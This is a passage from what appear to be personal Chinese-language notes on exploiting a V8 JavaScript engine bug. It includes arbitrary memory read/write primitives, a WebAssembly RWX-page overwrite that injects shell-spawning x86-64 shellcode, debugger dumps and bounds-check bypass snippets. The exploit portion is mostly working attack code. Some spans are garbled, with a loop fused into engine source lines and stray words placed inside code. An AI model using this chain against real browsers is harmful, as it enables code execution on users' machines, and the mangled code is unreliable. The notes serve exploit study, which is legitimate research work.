        // readline();
        fake_array[2]=i2f(addr-0x10);
        return f2i(test[0]);
    }
    function abwrite(addr,data)//参数为整
    {
        let adddr = addrof(fake_array);
        let test = fakeObj(i2f(f2i(adddr)-0x20));
        fake_array[2] = i2f(addr-0x10);
        test[0] = i2f(data);
    }
####  3.5
利用backstore写wasm_rwx
    var share_info = abread(leak_f + 0x18);
    console.log("[*] share_info ====> "+hex(share_info));
    var wasm_data = abread(share_info+8);
    console.log("[*] wasm_data ====> "+hex(wasm_data));
    var wasm_instance = abread(wasm_data+16);
    console.log("[*] wasm_instance ====> "+hex(wasm_instance));
    var wasm_rwx = abread(wasm_instance+0x88);//这里都没有写－１  因为obj
    console.log("[*] wasm_rwx ====> "+hex(wasm_rwx));
    //
    var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
        96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
        105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
        72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
        72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
        184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
        94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    let buf_new = new ArrayBuffer(0x200);
    let dataview = new DataView(buf_new);
    let leak_buf = f2i(addrof(buf_new));
    let fake_write = leak_buf + 0x20;//get backstore
    abwrite(fake_write,wasm_rwx);
    console.log("[*] fake_write  ====> "+hex(fake_write));
    for(var i=0;ipoisoning_level_ ==
       1586                   PoisoningMitigationLevel::kDontPoison &&
       1587               (index_type.IsNone() || length_type.IsNone() ||
       1588                (index_type.Min() >= 0.0 &&yuejie
     ► 1589                 index_type.Max()  i registers xmm0
    xmm0           {
      v4_float = {0x0, 0x1b, 0x0, 0x0}, 
      v2_double = {0x7fffffff, 0x0}, 
      v16_int8 = {0x0, 0x0, 0xc0, 0xff, 0xff, 0xff, 0xdf, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
      v8_int16 = {0x0, 0xffc0, 0xffff, 0x41df, 0x0, 0x0, 0x0, 0x0}, 
      v4_int32 = {0xffc00000, 0x41dfffff, 0x0, 0x0}, 
      v2_int64 = {0x41dfffffffc00000, 0x0}, 
      uint128 = 0x000000000000000041dfffffffc00000
就是说一定会进入这个状态喽?
     mode = CheckBoundsParameters::kAbortOnOutOfBounds;(m.left().Value() 
    [*] leak_f ====> 0x00002ec93f2e4cb1
    0x32c0943f9681 
    [*] share_info ====> 0x7ff8000000000000
    0x32c0943f9bc1 
    [*] wasm_data ====> 0x7ff8000000000000
    0x32c0943fa0a1 
    [*] wasm_instance ====> 0x7ff8000000000000
    0x32c0943fa589 
    [*] wasm_rwx ====> 0x7ff8000000000000
    解决：
    整数与浮点数的转化没有整明白
    写函数的时候标注出来最好
## 6 参考
## 7 知识技巧
浮点数汇编比较
    ucomisd S1,S2     S2-S1     比较双精度值
查看寄存器状态
    pwndbg> i registers xmm1
    xmm1           {
      v4_float = {0x0, 0x2, 0x0, 0x0}, 
      v2_double = {0x3, 0x0}, 
      v16_int8 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
      v8_int16 = {0x0, 0x0, 0x0, 0x4008, 0x0, 0x0, 0x0, 0x0}, 
      v4_int32 = {0x0, 0x40080000, 0x0, 0x0}, 
      v2_int64 = {0x4008000000000000, 0x0}, 
      uint128 = 0x00000000000000004008000000000000
    }
    pwndbg> i registers xmm0
    xmm0           {
     shibaishibai v4_float = {0x0, 0x1b, 0x0, 0x0}, 
      v2_double = {0x7fffffff, 0x0}, 
      v16_int8 = {0x0, 0x0, 0xc0, 0xff, 0xff, 0xff, 0xdf, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
      v8_int16 = {0x0, 0xffc0, 0xffff, 0x41df, 0x0, 0x0, 0x0, 0x0}, 
      v4_int32 = {0xffc00000, 0x41dfffff, 0x0, 0x0}, 
      v2_int64 = {0x41dfffffffc00000, 0x0}, 
      uint128 = 0x000000000000000041dfffffffc00000
    在触发漏洞的时候如果加上debugprint往往触发失败
    function foo(argg)
    {
        let oob = [1.0,1.1,1.2];
        let m = {o:3};
        // if(argg == 1)
        // {
            // %DebugPrint(oob);
        // }
        return oob[m.o];
    }
    可能由于代码变了 这次存在一个参数为１ 的判断
Fakeobj 其实就是存在一个obj的数组，将数组中的元素设置为你想伪造的类型的map值，
之后返回伪造的对象，虽然说伪造的对象与float值实现相等的，但是却是不同的意义
addrof 应用了数组的索引功能
任意地址读写应用的是数组的索引功能，伪造一个数组
根据一个特殊的array进行构造
几种跳过loadElement的方法
    function opt(){
        let arr = [0, 1, 2, 3];
        let idx = 4;
         idx &= 0xfff;
        return arr[idx];
    }
    for(var i=0; i < 0x10000; i++)
        opt()
    var x = opt()
    console.log(x)
    算数运算
    function opt(){
        let arr = [0, 1, 2, 3];
        let o = {x: 4};
         return arr[o.x];
    }
    for(var i=0; i < 0x10000; i++)
        opt()
    var x = opt()
    console.log(x)
    function opt(x){
        let arr = [0, 1, 2, 3];
        let idx = (x="foo")?4:2;
        return a[idx];
    }
    for(var i=0; i < 0x10000; i++)
        opt()
    var x = opt("foo")
    console.log(x)
    无效的phi节点